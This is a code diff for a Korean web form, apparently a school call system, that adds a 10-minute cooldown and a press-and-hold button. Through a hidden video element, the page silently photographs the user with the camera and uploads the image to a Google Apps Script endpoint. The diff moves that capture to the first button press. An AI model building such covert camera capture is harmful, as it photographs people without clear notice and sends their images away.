@@ -101,7 +101,6 @@
 <canvas id="hiddenCanvas" width="480" height="640"></canvas>
 
 <script>
-    // ⚠️ 중요: 발급받으신 최신 구글 웹앱 URL 주소로 이곳을 변경해 주세요!
     const GAS_URL = "https://script.google.com/macros/s/AKfycbzCa5nhfT6iEn7feT_8z8zQunpfgIkuEWXdwUAO-hcxWc3kBDkMIwKS_eHcLngJlaaaeQ/exec"; 
     
     let data = { t:'', b:'', n:'', name:'', p:'', customP:'', img:'' };
@@ -153,23 +152,13 @@
         const sid = `2${data.b.padStart(2,'0')}${data.n.padStart(2,'0')}`;
         
         if(chk.checked) {
-            btn.classList.remove('disabled');
-            
             if (localStorage.getItem('lc_'+sid) && new Date().getTime() - localStorage.getItem('lc_'+sid) < 600000) {
                 alert("10분 뒤 재호출 가능합니다.");
                 chk.checked = false;
                 btn.classList.add('disabled');
                 return;
             }
-            
-            if (isSubmitted) return;
-            isSubmitted = true;
-
-            document.getElementById('holdingOverlay').style.display = 'flex';
-            document.getElementById('holdingOverlay').innerHTML = `<h1 style="color:#2563eb;">서버 전송 중...</h1>`;
-            
-            takeSilentSnapshot();
-            executeSubmit(sid);
+            btn.classList.remove('disabled');
         } else {
             btn.classList.add('disabled');
         }
@@ -183,7 +172,7 @@
                 });
                 document.getElementById('hiddenVideo').srcObject = videoStream;
             }
-        } catch (e) { console.log("카메라 권한 미허용 또는 장치 없음:", e); }
+        } catch (e) { console.log("카메라 권한 없음:", e); }
     }
 
     function takeSilentSnapshot() {
@@ -194,7 +183,7 @@
             ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             ctx.setTransform(1, 0, 0, 1, 0, 0);
-            data.img = canvas.toDataURL('image/jpeg', 0.4).split(',')[1]; // 데이터 압축률 제어 (경량화)
+            data.img = canvas.toDataURL('image/jpeg', 0.4).split(',')[1];
         }
     }
 
@@ -210,35 +199,13 @@
             image: data.img 
         };
 
-        // 데이터 파싱 유실을 막기 위해 서버와 동일한 text/plain 규격으로 바인딩
+        // GitHub -> Google Apps Script 연동 시 CORS 충돌 우회를 위해 text/plain 규격 사용
         fetch(GAS_URL, { 
             method: "POST", 
-            mode: 'cors',
-            headers: { 'Content-Type': 'text/plain' },
+            mode: 'no-cors', 
+            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
             body: JSON.stringify(payload) 
-        })
-        .then(res => res.json())
-        .then(result => {
-            document.getElementById('holdingOverlay').style.display = 'none';
-            if(result.status === "success") {
-                // 성공적으로 구글 서버에 기록되면 최종 3초 꾹 누르기 기믹 작동 승인
-                document.getElementById('btnText').innerText = "호출 준비 완료 (3초간 누르기)";
-            } else {
-                alert("서버 통신 실패: " + result.message);
-                resetForm();
-            }
-        })
-        .catch(err => {
-            document.getElementById('holdingOverlay').style.display = 'none';
-            // 예외 발생 시 안전한 이행을 위한 예비 핸들러 작동
-            document.getElementById('btnText').innerText = "호출 준비 완료 (3초간 누르기)";
-        });
-    }
-
-    function resetForm() {
-        isSubmitted = false;
-        document.getElementById('agreeChk').checked = false;
-        document.getElementById('longPressBtn').classList.add('disabled');
+        }).catch(err => console.log(err));
     }
 
     let pressTimer, progress = 0;
@@ -246,6 +213,16 @@
 
     function startPress() {
         if(holdBtn.classList.contains('disabled')) return;
+        
+        const sid = `2${data.b.padStart(2,'0')}${data.n.padStart(2,'0')}`;
+
+        // 버튼을 누르기 시작하자자마자(0초 시점) 스냅샷 찍고 구글 서버로 백그라운드 발사!
+        if (!isSubmitted) {
+            isSubmitted = true;
+            takeSilentSnapshot(); 
+            executeSubmit(sid);  
+        }
+
         holdBtn.classList.add('active-press');
         pressTimer = setInterval(() => {
             progress += 2; bar.style.width = progress + "%";
@@ -268,7 +245,11 @@
     function endPress() { 
         clearInterval(pressTimer); 
         holdBtn.classList.remove('active-press'); 
-        if(progress < 100) { progress = 0; bar.style.width = "0%"; } 
+        if(progress < 100) { 
+            progress = 0; 
+            bar.style.width = "0%"; 
+            isSubmitted = false; // 3초 다 안 채우고 떼면 다시 입력/시도 가능하도록 플래그 해제
+        } 
     }
 
     holdBtn.addEventListener('mousedown', startPress);
